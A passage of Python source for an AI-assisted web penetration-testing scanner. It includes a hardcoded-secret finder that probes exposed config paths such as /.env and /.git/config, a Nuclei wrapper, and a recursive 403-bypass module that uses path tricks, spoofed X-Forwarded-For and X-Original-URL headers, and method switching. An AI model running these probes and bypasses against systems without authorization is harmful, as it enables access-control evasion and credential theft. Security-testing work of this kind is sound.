        self.console = console_obj
        self.FindingClass = finding_class
        self.max_js_files = max_js_files
        self._compiled_not_leak = [re.compile(sig, re.IGNORECASE) for sig in self._NOT_LEAK_SIGNALS]
        self._compiled_patterns = self._compile_patterns()
        self._seen_values: set = set()

    def _compile_patterns(self) -> list:
        compiled = []
        for pattern in self.SECRET_PATTERNS:
            try:
                compiled.append({**pattern, "_re": re.compile(pattern["regex"], re.IGNORECASE | re.MULTILINE)})
            except re.error:
                pass
        return compiled

    @staticmethod
    def _normalized_body_hash(body: str) -> str:
        sample = str(body or "")[:12000]
        sample = re.sub(r"https?://[^\s\"'<>]+", " URL ", sample, flags=re.I)
        sample = re.sub(r"\s+", " ", sample).strip().lower()
        return hashlib.md5(sample.encode("utf-8", errors="ignore")).hexdigest()

    @staticmethod
    def _is_example_config_path(path: str) -> bool:
        path_l = str(path or "").lower()
        return any(token in path_l for token in (".example", "example.", "/examples/", "sample", "demo"))

    def _looks_like_real_config_body(self, path: str, body: str, headers: Optional[dict] = None) -> bool:
        path_l = str(path or "").lower()
        body = str(body or "")
        body_s = body.strip()
        if len(body_s) < 10:
            return False
        ct = ResponseClassifier.normalize_content_type(headers or {})
        profile = ResponseClassifier.classify(path, headers or {}, body, 200)
        if profile.get("verdict") in {"public_page", "login_page", "static_asset"}:
            return False

        body_l = body_s[:12000].lower()

        if path_l.endswith("/dockerfile") or path_l.endswith("dockerfile"):
            return any(marker in body_l for marker in ("\nfrom ", "from ", "\nrun ", "\ncopy ", "\nentrypoint", "\ncmd "))
        if path_l.endswith("jenkinsfile"):
            return any(marker in body_l for marker in ("pipeline {", "node {", "stage(", "agent any"))
        if path_l.endswith("/.git/config"):
            return any(marker in body_l for marker in ("[core]", "[remote ", "[branch "))
        if path_l.endswith("/.npmrc"):
            return bool(re.search(r"(?m)^(?:registry|always-auth|_authToken|//.+:_authToken)\s*=", body_s))
        if path_l.endswith("/.pypirc"):
            return any(marker in body_l for marker in ("[distutils]", "[pypi]", "[testpypi]"))
        if path_l.endswith(".properties"):
            return bool(re.search(r"(?m)^[A-Za-z0-9_.-]+\s*=\s*\S+", body_s))
        if any(token in path_l for token in ("/.env", ".env.local", ".env.production", ".env.backup", ".env.example")):
            return bool(re.search(r"(?m)^[A-Z][A-Z0-9_]{1,}\s*=\s*.+$", body_s))
        if path_l.endswith(".php"):
            return "<?php" in body_l and any(marker in body_l for marker in ("define(", "$", "return [", "array("))
        if path_l.endswith("web.config"):
            return body_l.startswith("<?xml") or "<configuration" in body_l or "<appsettings" in body_l
        if path_l.endswith((".json", ".json5")) or "appsettings" in path_l or path_l.endswith("composer.json"):
            try:
                parsed = json.loads(body_s)
            except Exception:
                return False
            return isinstance(parsed, (dict, list))
        if path_l.endswith((".yaml", ".yml")):
            yaml_markers = ("version:", "services:", "steps:", "jobs:", "stages:", "pipelines:", "build:")
            if any(marker in body_l for marker in yaml_markers):
                return True
            return len(re.findall(r"(?m)^\s{0,4}[A-Za-z0-9_.-]+\s*:\s*.+$", body_s)) >= 2
        if "xml" in ct:
            return body_l.startswith("<?xml") or "<configuration" in body_l
        if "json" in ct:
            try:
                parsed = json.loads(body_s)
            except Exception:
                return False
            return isinstance(parsed, (dict, list))
        return False

    def scan(self, endpoints: list, page_cache: dict, target: str) -> list:
        self._seen_values = set()
        self.console.print(f"  [dim]  {len(page_cache)} cached pages + JS files scanning...[/dim]")
        findings: list = []
        scanned_urls: set = set()
        candidates_found = 0
        candidates_confirmed = 0
        for url, resp in page_cache.items():
            if url in scanned_urls:
                continue
            scanned_urls.add(url)
            body = resp.get("body", "") if isinstance(resp, dict) else ""
            if not body:
                continue
            content_type = resp.get("headers", {}).get("content-type", "") if isinstance(resp, dict) else ""
            new_findings, cand, conf = self._scan_content(body, url, content_type)
            findings.extend(new_findings)
            candidates_found += cand
            candidates_confirmed += conf
        js_urls = self._discover_js_urls(endpoints, page_cache, target)
        self.console.print(f"  [dim]  {len(js_urls)} JS file(s) to scan[/dim]")
        for js_url in js_urls:
            if js_url in scanned_urls:
                continue
            scanned_urls.add(js_url)
            try:
                response = self.client.get(js_url)
            except Exception as exc:
                self.console.print(f"  [dim red]  JS fetch error: {js_url} — {exc}[/dim red]")
                continue
            if response.get("status") != 200 or not response.get("body"):
                continue
            new_findings, cand, conf = self._scan_content(response["body"], js_url, "application/javascript")
            findings.extend(new_findings)
            candidates_found += cand
            candidates_confirmed += conf
        findings.extend(self._probe_config_files(target))
        self.console.print(f"  [green]✓ Source Code Review: {candidates_found} candidate(s) → {candidates_confirmed} confirmed → {len(findings)} finding(s)[/green]")
        return findings

    def _scan_content(self, body: str, url: str, content_type: str) -> tuple:
        findings = []
        candidates = 0
        confirmed = 0
        lines = body.split("\n")
        line_map = {idx + 1: line for idx, line in enumerate(lines)}
        for pattern in self._compiled_patterns:
            for match in pattern["_re"].finditer(body):
                matched_value = match.group(1) if match.lastindex else match.group(0)
                matched_value = matched_value.strip().strip("\"'")
                if not matched_value or len(matched_value) < 4:
                    continue
                val_hash = hashlib.md5(f"{pattern['name']}:{matched_value}".encode()).hexdigest()
                if val_hash in self._seen_values:
                    continue
                self._seen_values.add(val_hash)
                try:
                    validate_fn = pattern.get("validate")
                    if validate_fn and not validate_fn(matched_value):
                        continue
                except Exception:
                    continue
                context_window = self._get_context(body, match.start(), window=300)
                if self._is_not_leak(matched_value, context_window):
                    continue
                risk = pattern["risk"]
                min_entropy = self.MIN_ENTROPY.get(risk, 2.5)
                if min_entropy > 0:
                    entropy = self._shannon_entropy(matched_value)
                    if entropy < min_entropy:
                        continue
                candidates += 1
                line_no = body[:match.start()].count("\n") + 1
                line_text = line_map.get(line_no, "").strip()[:120]
                ctx_start = max(1, line_no - 3)
                ctx_end = min(len(line_map), line_no + 3)
                context_lines = "\n".join(f"  {n:4d}: {line_map.get(n, '')[:100]}" for n in range(ctx_start, ctx_end + 1))
                self.console.print(f"  [yellow]  🔍 Candidate [{risk}]: {pattern['name']} in {url.split('/')[-1] or url}:{line_no}[/yellow]")
                ai_result = self._ai_classify(pattern_name=pattern["name"], matched_value=matched_value, context_lines=context_lines, url=url, suggested_risk=risk)
                if not ai_result.get("is_real_leak", False):
                    self.console.print(f"  [dim]    → AI: NOT a real leak — {str(ai_result.get('reason', ''))}[/dim]")
                    continue
                confirmed += 1
                final_risk = ai_result.get("risk", risk)
                color = {"Critical": "bold red", "High": "red", "Medium": "yellow", "Low": "cyan", "Info": "dim"}.get(final_risk, "white")
                self.console.print(f"  [{color}]  🚨 CONFIRMED [{final_risk}]: {ai_result.get('title', pattern['name'])}[/{color}]")
                masked = self._mask_value(matched_value, risk)
                finding = self._make_finding(
                    title=ai_result.get("title", f"Hardcoded Secret: {pattern['name']} in {url.split('/')[-1] or url}"),
                    risk=final_risk,
                    confidence=ai_result.get("confidence", 80),
                    url=url,
                    evidence=f"{pattern['name']} found at line {line_no}. AI: {str(ai_result.get('what_is_it', ''))[:150]}",
                    tool_output=f"Pattern: {pattern['name']}\nValue: {masked}\nLine {line_no}: {line_text}\nContext:\n{context_lines}",
                    request_raw=f"GET {url}",
                    response_raw=f"Line {line_no}: {line_text}",
                    exploit_cmd=ai_result.get("exploit_hint", f"# Leaked credential at {url} line {line_no}"),
                    remediation=ai_result.get("remediation", "Move secrets to environment variables. Rotate compromised credentials immediately."),
                    confirmed=final_risk in ("Critical", "High"),
                    param="source_code",
                    payload="",
                    baseline_diff="source_code_review",
                )
                if finding:
                    findings.append(finding)
        return findings, candidates, confirmed

    def _ai_classify(self, pattern_name: str, matched_value: str, context_lines: str, url: str, suggested_risk: str) -> dict:
        prompt = f"""You are a security expert analyzing source code for leaked secrets.

FOUND IN SOURCE CODE:
  URL/File:      {url}
  Pattern name:  {pattern_name}
  Suggested risk: {suggested_risk}

<untrusted_content>
  Matched value: {matched_value!r}

  CODE CONTEXT (surrounding lines):
{context_lines}
</untrusted_content>

YOUR TASK: Determine if this is a REAL hardcoded secret/credential leak.

CLASSIFICATION RULES:

DEFINITELY NOT A LEAK (return is_real_leak: false):
- Analytics/tracking IDs that are PUBLIC BY DESIGN:
  * Google Analytics (UA-xxxxx, G-xxxxx, GTM-xxxxx)
  * Yandex Metrica counter IDs (8-9 digit numbers)
  * Facebook Pixel IDs
- Values from environment variables: process.env.X, os.environ['X'], getenv(), env()
- Template placeholders: YOUR_KEY_HERE, <API_KEY>, xxx, ***, ...
- Demo/test/sandbox keys clearly labeled as such
- Public API keys that are read-only and restricted by domain/referrer

REAL LEAK (return is_real_leak: true):
- AWS credentials (AKIA... + secret)
- Private keys (RSA, EC, SSH)
- Database passwords that look real (not 'password123' demos)
- JWT secrets hardcoded in source
- Stripe/PayPal LIVE keys (sk_live_...)
- OAuth client secrets
- Service account JSON keys
- Any bearer token or API key with high entropy that is NOT clearly public
- Telegram/Slack/Discord bot tokens

Return JSON:
{{
  "is_real_leak": true/false,
  "title": "Short descriptive title",
  "what_is_it": "What this credential is and what access it provides",
  "risk": "Critical|High|Medium|Low|Info",
  "confidence": 0-100,
  "reason": "Why this IS or IS NOT a real leak (cite context)",
  "exploit_hint": "curl/python command showing how this could be exploited",
  "remediation": "Specific steps to fix"
}}"""
        try:
            result = self.ai._call(prompt, cache=False)
        except Exception:
            result = None
        if isinstance(result, dict) and "is_real_leak" in result:
            return result
        entropy = self._shannon_entropy(matched_value)
        is_real = entropy >= 3.5 and len(matched_value) >= 20 and suggested_risk in ("Critical", "High")
        return {
            "is_real_leak": is_real,
            "title": f"{pattern_name} in source code",
            "what_is_it": f"Potential {pattern_name}",
            "risk": suggested_risk,
            "confidence": 60 if is_real else 30,
            "reason": f"Heuristic: entropy={entropy:.2f}, len={len(matched_value)}",
            "remediation": "Move to environment variables. Rotate if real.",
        }

    def _probe_config_files(self, target: str) -> list:
        findings = []
        base = target.rstrip("/")
        root_hash = ""
        root_profile = {"verdict": "unknown"}
        try:
            root_response = self.client.get(base)
            if root_response.get("status") == 200 and root_response.get("body"):
                root_profile = ResponseClassifier.classify(
                    base,
                    root_response.get("headers", {}),
                    root_response.get("body", ""),
                    root_response.get("status", 0),
                )
                root_hash = self._normalized_body_hash(root_response.get("body", ""))
        except Exception:
            pass
        config_paths = [
            "/.env", "/.env.local", "/.env.production", "/.env.backup", "/.env.example",
            "/config.json", "/config.yaml", "/config.yml", "/appsettings.json", "/appsettings.Development.json",
            "/application.properties", "/application.yml", "/web.config", "/.git/config", "/wp-config.php",
            "/config/database.yml", "/config/secrets.yml", "/config/credentials.yml", "/.npmrc", "/.pypirc",
            "/composer.json", "/Dockerfile", "/docker-compose.yml", "/.travis.yml", "/.circleci/config.yml",
            "/Jenkinsfile", "/cloudbuild.yaml",
        ]
        for path in config_paths:
            url = base + path
            try:
                response = self.client.get(url)
            except Exception as exc:
                self.console.print(f"  [dim]  Config probe error: {url} — {exc}[/dim]")
                continue
            if response.get("status") != 200 or not response.get("body"):
                continue
            body = response.get("body", "")
            if len(body) < 10:
                continue
            headers = response.get("headers", {})
            profile = ResponseClassifier.classify(url, headers, body, response.get("status", 0))
            body_hash = self._normalized_body_hash(body)
            strong_sensitive = RiskScorer.has_strong_sensitive_candidate(
                RiskScorer.score_body(body, url=url, headers=headers)
            )
            looks_config = self._looks_like_real_config_body(path, body, headers)
            if not strong_sensitive:
                if profile.get("verdict") in {"public_page", "login_page", "static_asset"}:
                    continue
                if root_hash and body_hash == root_hash and root_profile.get("verdict") in {"public_page", "login_page", "unknown"}:
                    continue
                if not looks_config:
                    continue

            self.console.print(f"  [yellow]  📄 Config file exposed: {url}[/yellow]")
            new_findings, _, _ = self._scan_content(body, url, "text/plain")
            if new_findings:
                findings.extend(new_findings)
                continue
            sensitive_config_path = any(
                sp in path for sp in [".env", "config.json", "appsettings", "secrets.yml", "credentials", "wp-config", "database.yml"]
            )
            if sensitive_config_path and (looks_config or strong_sensitive) and not (self._is_example_config_path(path) and not strong_sensitive):
                finding = self._make_finding(
                    title=f"Configuration File Exposed: {path}",
                    risk="High",
                    confidence=85,
                    url=url,
                    evidence=f"Configuration file accessible without authentication: {path}",
                    tool_output=body[:500],
                    request_raw=f"GET {url}",
                    response_raw=body[:500],
                    exploit_cmd=f"curl -s '{url}'",
                    remediation="Block web access to configuration files. Add to .htaccess or nginx deny rules. Move config outside web root.",
                    confirmed=True,
                    param="URL_PATH",
                    payload="",
                    baseline_diff="config_exposed",
                    owasp_id="A05",
                    owasp_name="Security Misconfiguration",
                )
                if finding:
                    findings.append(finding)
        return findings

    def _discover_js_urls(self, endpoints: list, page_cache: dict, target: str) -> List[str]:
        js_urls = set()
        parsed_target = urllib.parse.urlparse(target)
        base_host = parsed_target.netloc
        allowed_schemes = {"http", "https"}
        for url, resp in page_cache.items():
            body = resp.get("body", "") if isinstance(resp, dict) else ""
            if not body:
                continue
            for match in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', body, re.I):
                js_ref = match.group(1)
                try:
                    js_abs = urllib.parse.urljoin(url, js_ref)
                    parsed = urllib.parse.urlparse(js_abs)
                    if parsed.scheme in allowed_schemes and parsed.netloc == base_host and ".." not in parsed.path:
                        js_urls.add(js_abs)
                except Exception:
                    pass
            for match in re.finditer(r'"([^"]+\.js)"', body):
                try:
                    js_abs = urllib.parse.urljoin(url, match.group(1))
                    parsed = urllib.parse.urlparse(js_abs)
                    if parsed.scheme in allowed_schemes and parsed.netloc == base_host and "node_modules" not in js_abs and ".." not in parsed.path:
                        js_urls.add(js_abs)
                except Exception:
                    pass
        static_bases: set = set()
        for url in list(js_urls):
            parsed = urllib.parse.urlparse(url)
            path = parsed.path.lower()
            if any(x in path for x in ["/static/", "/assets/", "/js/", "/dist/"]):
                dir_path = parsed.path.rsplit("/", 1)[0]
                static_bases.add(urllib.parse.urlunparse(parsed._replace(path=dir_path, query="")))
        for base_dir in static_bases:
            for chunk in ["main.js", "app.js", "bundle.js", "runtime.js", "vendor.js", "chunk.js", "index.js"]:
                candidate = f"{base_dir}/{chunk}"
                parsed_candidate = urllib.parse.urlparse(candidate)
                if parsed_candidate.scheme in allowed_schemes and parsed_candidate.netloc == base_host:
                    js_urls.add(candidate)
        return list(js_urls)[: self.max_js_files]

    def _is_not_leak(self, value: str, context: str) -> bool:
        combined = (value + " " + context).lower()
        return any(pattern.search(combined) for pattern in self._compiled_not_leak)

    @staticmethod
    def _shannon_entropy(value: str) -> float:
        if not value:
            return 0.0
        freq = {}
        for char in value:
            freq[char] = freq.get(char, 0) + 1
        total = len(value)
        entropy = -sum((count / total) * math.log2(count / total) for count in freq.values())
        return round(entropy, 3)

    @staticmethod
    def _mask_value(value: str, risk: str) -> str:
        if risk == "Info":
            return value
        length = len(value)
        if length <= 6:
            return value[:2] + "*" * max(length - 2, 0)
        return value[:4] + "*" * max(4, length - 6) + value[-2:]

    @staticmethod
    def _get_context(body: str, pos: int, window: int = 300) -> str:
        start = max(0, pos - window // 2)
        end = min(len(body), pos + window // 2)
        return body[start:end]

    def _make_finding(
        self,
        title: str,
        risk: str,
        confidence: int,
        url: str,
        evidence: str,
        tool_output: str,
        request_raw: str,
        response_raw: str,
        exploit_cmd: str,
        remediation: str,
        confirmed: bool,
        param: str = "source_code",
        payload: str = "",
        baseline_diff: str = "source_code_review",
        owasp_id: str = "A02",
        owasp_name: str = "Cryptographic Failures",
        method: str = "GET",
    ):
        FindingClass = self.FindingClass or Finding
        try:
            return FindingClass(
                owasp_id=owasp_id,
                owasp_name=owasp_name,
                title=title,
                risk=risk,
                confidence=confidence,
                url=url,
                method=method,
                param=param,
                payload=payload,
                evidence=evidence,
                baseline_diff=baseline_diff,
                tool_output=tool_output,
                request_raw=request_raw,
                response_raw=response_raw,
                exploit_cmd=exploit_cmd,
                remediation=remediation,
                confirmed=confirmed,
                tool="source_code_review",
            )
        except Exception:
            return None


class NucleiRunner:
    OWASP_MAP = {
        "sqli":"A03","xss":"A03","lfi":"A03","rce":"A03","ssti":"A03",
        "ssrf":"A10","xxe":"A03","cmdi":"A03","idor":"A01","bac":"A01",
        "auth":"A07","cors":"A05","misconfig":"A05","exposure":"A05",
        "cve":"A06","default":"A07","jwt":"A02",
    }

    def run(self, target: str, tech: dict, session: SessionContext) -> List[Finding]:
        if not shutil.which("nuclei"): return []
        tags = ["cve","misconfig","exposure","default-login"]
        if tech.get("cms")=="wordpress":     tags.append("wordpress")
        if tech.get("lang")=="php":          tags.append("php")
        if tech.get("framework")=="spring":  tags.append("spring")
        if tech.get("framework")=="django":  tags.append("django")
        auth = ""
        if session.cookies:
            auth += f" -H 'Cookie: {'; '.join(f'{k}={v}' for k,v in session.cookies.items())}'"
        if session.jwt_token:
            auth += f" -H 'Authorization: Bearer {session.jwt_token}'"
        out  = "/tmp/nuclei_v8.txt"
        cmd  = (f"nuclei -u '{target}' -tags '{','.join(tags)}' "
                f"-severity critical,high,medium -silent -timeout 8 -o '{out}' {auth}")
        subprocess.run(cmd, shell=True, capture_output=True, timeout=200)
        findings, rmap = [], {
            "A06":"Vulnerable Components","A03":"Injection",
            "A05":"Security Misconfiguration","A01":"BAC","A07":"Auth Failures"
        }
        if not Path(out).exists(): return []
        pat = re.compile(r'\[([^\]]+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(https?://\S+)')
        risk_map = {"critical":"Critical","high":"High","medium":"Medium","low":"Low"}
        for line in Path(out).read_text().splitlines():
            m = pat.search(line)
            if not m: continue
            tid  = m.group(2); risk = risk_map.get(m.group(3).lower(),"Medium")
            url  = m.group(4); owasp = "A06"
            for kw, oid in self.OWASP_MAP.items():
                if kw in tid.lower(): owasp = oid; break
            findings.append(Finding(
                owasp_id=owasp, owasp_name=rmap.get(owasp,""),
                title=f"[Nuclei] {tid}", risk=risk,
                confidence=88 if risk in ("Critical","High") else 70,
                url=url, method="GET", param=tid, payload="",
                evidence=line.strip()[:300], baseline_diff="nuclei",
                tool_output=line.strip()[:300],
                request_raw=f"nuclei -u {url} -tags {','.join(tags)}",
                response_raw="",
                exploit_cmd=f"nuclei -u '{url}' -id '{tid}'",
                remediation=f"Fix {tid}.",
                confirmed=risk in ("Critical","High"), tool="nuclei",
            ))
            console.print(f"  [bold red]🎯 Nuclei [{risk}] {tid}[/bold red]")
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# RECURSIVE 403 BYPASSER
# ─────────────────────────────────────────────────────────────────────────────
class Recursive403Bypasser:
    PATH_VARIANTS = [
        lambda u: u+"/",
        lambda u: u+"%20",
        lambda u: u+"%09",
        lambda u: u+"/..",
        lambda u: u+"..;/",
        lambda u: u+"?",
        lambda u: u+"/*",
        lambda u: re.sub(r'(/\w+)$', r'/.\1', u),
        lambda u: u.replace("/admin","//admin") if "/admin" in u else u+"//",
    ]
    HEADER_VARIANTS = [
        {"X-Forwarded-For":"127.0.0.1"},
        {"X-Real-IP":"127.0.0.1"},
        {"X-Custom-IP-Authorization":"127.0.0.1"},
        {"X-Forwarded-Host":"localhost"},
        {"X-Host":"127.0.0.1"},
        {"Client-IP":"127.0.0.1"},
        {"X-Original-URL":"PLACEHOLDER"},
        {"X-Rewrite-URL":"PLACEHOLDER"},
    ]

    def __init__(self, client: HTTPClient, ai: AIEngine):
        self.client   = client
        self.ai       = ai
        self._visited: Set[str] = set()

    def bypass(self, start_url: str, max_depth: int = 3) -> List[Finding]:
        findings  : List[Finding] = []
        bfs_queue = [(start_url, 0)]

        while bfs_queue:
            url, depth = bfs_queue.pop(0)
            if url in self._visited or depth > max_depth: continue
            self._visited.add(url)

            bl      = self.client.get(url)
            bl_hash = hashlib.md5(bl.get("body","").encode()).hexdigest()
            path    = urllib.parse.urlparse(url).path

            def potential(r: dict) -> bool:
                if r["status"] not in (200,206): return False
                if not r.get("body") or len(r["body"]) < 50: return False
                if hashlib.md5(r["body"].encode()).hexdigest() == bl_hash: return False
                lk = sum(1 for s in ["login","sign in","password","username"]
                          if s in r["body"].lower())
                return lk < 2

            def ai_verify(r: dict, test_url: str, bt: str) -> Optional[dict]:
                result = self.ai.analyze_403_response(
                    parent_url=url, child_url=test_url,
                    child_status=r["status"], child_body=r["body"],
                    child_headers=r.get("headers",{}),
                    context=f"403bypass_{bt}_depth{depth}",
                )
                if not result: return None
                if result.get("is_real_bac") and result.get("confidence",0) >= MIN_CONFIDENCE:
                    console.print(f"  [bold red]  🎯 {bt} bypass: {test_url}[/bold red]")
                    return result
                return None

            # Path variants
            for vfn in self.PATH_VARIANTS:
                try:
                    tu = vfn(url)
                except Exception:
                    continue
                r = self.client.get(tu)
                if potential(r):
                    ai_r = ai_verify(r, tu, "path")
                    if ai_r:
                        findings.append(self._make(
                            f"403 Bypass (path): {path}", tu, path,
                            tu[len(url):], f"curl -v '{tu}'", r["body"][:300], depth, ai_r
                        ))

            # Header variants
            for hdrs in self.HEADER_VARIANTS:
                h  = {k:(path if v=="PLACEHOLDER" else v) for k,v in hdrs.items()}
                r  = self.client._request(url,"GET",headers=h)
                if potential(r):
                    hn = list(h.keys())[0]; hv = list(h.values())[0]
                    ai_r = ai_verify(r, url, f"header_{hn}")
                    if ai_r:
                        findings.append(self._make(
                            f"403 Bypass (header {hn}): {path}",url,path,
                            f"{hn}:{hv}",f"curl -H '{hn}: {hv}' '{url}'",
                            r["body"][:300],depth,ai_r
                        ))

            # Method variants
            for method in ("POST","PUT","PATCH","OPTIONS"):
                r = self.client._request(url,method)
                if potential(r):
                    ai_r = ai_verify(r, url, f"method_{method}")
                    if ai_r:
                        findings.append(self._make(
                            f"403 Bypass ({method}): {path}",url,path,
                            method,f"curl -X {method} '{url}'",
                            r["body"][:300],depth,ai_r
                        ))

            # Recursive inner fuzz
            if depth < max_depth and shutil.which("ffuf"):
                wl = WordlistScanner.best("dirs")
                if wl and Path(wl).exists():
                    out_file = f"/tmp/403inner_{hashlib.md5(url.encode()).hexdigest()[:8]}.json"
                    try:
                        subprocess.run(
                            f"ffuf -u '{url}/FUZZ' -w '{wl}' "
                            f"-t 50 -timeout 8 -maxtime 40 -mc 200,201,301,302,403 "
                            f"-o '{out_file}' -of json -s",
                            shell=True, capture_output=True, timeout=55
                        )
                        data = json.loads(Path(out_file).read_text()) if Path(out_file).exists() else {}
                        for item in data.get("results",[]):
                            child_url    = item.get("url","")
                            child_status = item.get("status",0)
                            if not child_url: continue
                            if child_status in (200,201):
                                cr = self.client.get(child_url)
                                if cr["status"] in (200,201) and cr.get("body"):
                                    ai_r = ai_verify(cr, child_url, "inner_ffuf")
                                    if ai_r:
                                        findings.append(self._make(
                                            f"Forbidden parent, child accessible: {child_url}",
                                            child_url,child_url,child_url,
                                            f"curl -v '{child_url}'",cr["body"][:300],depth,ai_r
                                        ))
                            elif child_status==403 and child_url not in self._visited:
                                bfs_queue.append((child_url, depth+1))
                    except Exception:
                        pass
        return findings

    def _make(self, title:str, url:str, path:str, payload:str,
              exploit:str, resp:str, depth:int, ai_r:dict=None) -> Finding:
        conf      = ai_r.get("confidence",70) if ai_r else 70
        confirmed = (ai_r.get("is_real_bac",False) and conf>=70) if ai_r else False
        evidence  = (
            f"HTTP 403 → 200 bypass at depth {depth}. "
            f"AI: {ai_r.get('verdict','?')} — {ai_r.get('what_i_see','')[:100]}. "
            f"Reason: {ai_r.get('reason','')[:100]}"
        ) if ai_r else f"HTTP 403 → 200 at depth {depth}"
        return Finding(
            owasp_id="A01",owasp_name="Broken Access Control",
            title=title,risk="High",confidence=conf,
            url=url,method="GET",param="URL/Header",payload=payload[:200],
            evidence=evidence,baseline_diff="403→200",
            tool_output=resp[:2000] if resp else "",
            request_raw=f"GET {url}",response_raw=resp[:2000] if resp else "",
            exploit_cmd=exploit,
            remediation="Enforce authorization at every path level recursively.",
            confirmed=confirmed,tool="recursive_403",
        )


# ─────────────────────────────────────────────────────────────────────────────
# FP FILTER
# ─────────────────────────────────────────────────────────────────────────────
class FPFilter:
    def __init__(self, ai: AIEngine, client: HTTPClient,
                 memory: "FailureMemory" = None, tech: dict = None):
        self.ai       = ai
        self.client   = client
        self._memory  = memory
        self._tech    = tech or {}

    def filter(self, findings: List[Finding]) -> List[Finding]:
        findings = self._dedup(findings)
        passed   = []
        for f in findings:
            is_bac = any(
                k in (f.title+f.tool).lower()
                for k in ["403","bypass","acl","forbidden","recursive","no auth required"]
            )
            # Pre-verified confirmed BAC — pass through
            if is_bac and f.confirmed and f.tool in ("acl_bypass","recursive_403"):
                passed.append(f); continue

            # Confirmed non-BAC — pass through (but still FP-filter borderline ones)
            if f.confirmed and not is_bac:
                if self._quick_fp(f):
                    f.fp_filtered = True
                    if not f.suppression_reason:
                        f.suppression_reason = "Quick filter: confirmed finding matches public/static/login response."
                    continue
                passed.append(f); continue

            if self._quick_fp(f):
                f.fp_filtered = True
                f.suppression_reason = "Quick filter: no reproducible signal."
                continue

            fp = self.ai.fp_filter(f)
            if fp.get("is_fp"):
                f.fp_filtered     = True
                f.confirmed       = False
                f.suppression_reason = fp.get("reason","") or "AI FP filter."
                # Topshiriq 2: AI nima uchun FP ekanini tushuntirsin
                fp_reason_text = fp.get("reason","no reason")[:120]
                fp_conf = fp.get("adjusted_confidence", f.confidence)
                console.print(
                    f"  [dim yellow]  🤖 AI FP: {f.title[:55]}[/dim yellow]\n"
                    f"  [dim]     Why FP: {fp_reason_text}[/dim]\n"
                    f"  [dim]     Confidence adjusted: {f.confidence}% → {fp_conf}%[/dim]"
                )
                # FailureMemory: bu FP pattern yodlanadi
                if self._memory:
                    self._memory.record_false_positive(
                        finding=f,
                        fp_reason=fp.get("reason","unknown"),
                        tech=self._tech,
                    )
                continue

            f.confidence = int(fp.get("adjusted_confidence", f.confidence))
            if f.confidence < MIN_CONFIDENCE:
                f.fp_filtered     = True
                f.suppression_reason = f"Low confidence: {f.confidence}%"
                continue

            passed.append(f)
        return passed

    def _dedup(self, findings: List[Finding]) -> List[Finding]:
        seen: dict = {}
        for f in findings:
            key = f"{f.title}|{f.url}|{f.param}"
            if key not in seen or f.confidence > seen[key].confidence:
                seen[key] = f
        removed = len(findings) - len(seen)
        if removed:
            console.print(f"  [dim]  Dedup: {removed} duplicates removed[/dim]")
        return list(seen.values())

    def _quick_fp(self, f: Finding) -> bool:
        has_signal = bool((f.evidence or "").strip() or (f.tool_output or "").strip())
        if not f.baseline_diff and not has_signal: return True
        body = f.response_raw.lower()
        profile = ResponseClassifier.classify(f.url, {}, f.response_raw, 200)
        title_l = f.title.lower()
        if profile.get("verdict") in {"static_asset", "public_page", "login_page"}:
            if any(token in title_l for token in [
                "auth bypass", "no auth required", "bypass", "sensitive data exposure"
            ]):
                f.suppression_reason = f"Response classified as {profile.get('verdict')}."
                return True
        if any(k in body for k in ["access denied","blocked by","firewall","captcha"]) and \
           f.confidence < 70:
            f.suppression_reason = "Generic blocking page."
            return True
        return False


# ─────────────────────────────────────────────────────────────────────────────
# CORRELATOR
# ─────────────────────────────────────────────────────────────────────────────
class Correlator:
    def __init__(self, ai: AIEngine):
        self.ai = ai

    def correlate(self, findings: List[Finding], signals: List[dict]) -> List[Finding]:
        new_findings: List[Finding] = []
        if signals:
            by_url = collections.defaultdict(list)
            for s in signals:
                by_url[s.get("url","")].append(s)
            for url, sigs in by_url.items():
                if len(sigs) >= 2:
                    correlated = self.ai.correlate(sigs)
                    for c in correlated:
                        if c.get("confidence",0) >= MIN_CONFIDENCE:
                            new_findings.append(Finding(
                                owasp_id=c.get("owasp_id","A05"),
                                owasp_name=c.get("owasp_name","Correlated"),
                                title=c.get("title","Correlated weakness"),
                                risk=c.get("risk","Medium"),
                                confidence=c.get("confidence",50),
                                url=url,method="",param="multiple",
                                payload="multiple signals",
                                evidence=c.get("evidence",""),
                                baseline_diff="",tool_output="",
                                request_raw="",response_raw="",
                                exploit_cmd="",remediation="",
                            ))
        # Attack chain detection
        by_owasp = collections.defaultdict(list)
        for f in findings:
            if not f.fp_filtered: by_owasp[f.owasp_id].append(f)
        chains = [
            (["A01","A03"],"BAC + Injection → Full compromise"),
            (["A10","A03"],"SSRF + Injection → Internal pivot"),
            (["A02","A01"],"Crypto + BAC → Token forgery"),
        ]
        for chain_ids, desc in chains:
            cfs = [f for cid in chain_ids if cid in by_owasp for f in by_owasp[cid][:1]]
            if len(cfs) >= len(chain_ids):
                new_findings.append(Finding(
                    owasp_id="A04",owasp_name="Insecure Design",
                    title=f"Attack Chain: {desc}",
                    risk="Critical",confidence=75,
                    url=cfs[0].url,method="",param="chain",
                    payload=" → ".join(chain_ids),
                    evidence=f"Chain: {' → '.join(f.title[:30] for f in cfs[:2])}",
                    baseline_diff="chain",tool_output="",request_raw="",response_raw="",
                    exploit_cmd="# Multi-step exploitation chain",
                    remediation="Address each vulnerability. Defense-in-depth.",
                ))
        return findings + new_findings


# ─────────────────────────────────────────────────────────────────────────────
# REPORTER
# ─────────────────────────────────────────────────────────────────────────────
class Reporter:
    def __init__(self, target: str):
        self.target   = target
        self.scan_log: list = []

    def log(self, step: str, action: str, details: dict = None):
        self.scan_log.append({
            "ts": datetime.datetime.now().isoformat(),
            "step": step, "action": action, "details": details or {},
        })

    def save(
        self,
        findings: List[Finding],
        *,
        scan_log: Optional[List[str]] = None,
        endpoint_analysis: Optional[List[dict]] = None,
        ai_analysis: str = "",
        meta: Optional[dict] = None,
    ) -> Path:
        ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r'[^\w.]', '_', self.target)

        confirmed  = [f for f in findings if not f.fp_filtered]
        suppressed = [f for f in findings if f.fp_filtered]

        # JSON findings
        fp = REPORT_DIR / f"findings_{safe}_{ts}.json"
        mp = REPORT_DIR / f"pentest_{safe}_{ts}.md"
        hp = REPORT_DIR / f"report_{safe}_{ts}.html"
        dp = None
        pp = None
        risk_cnt  = collections.Counter(f.risk  for f in confirmed)
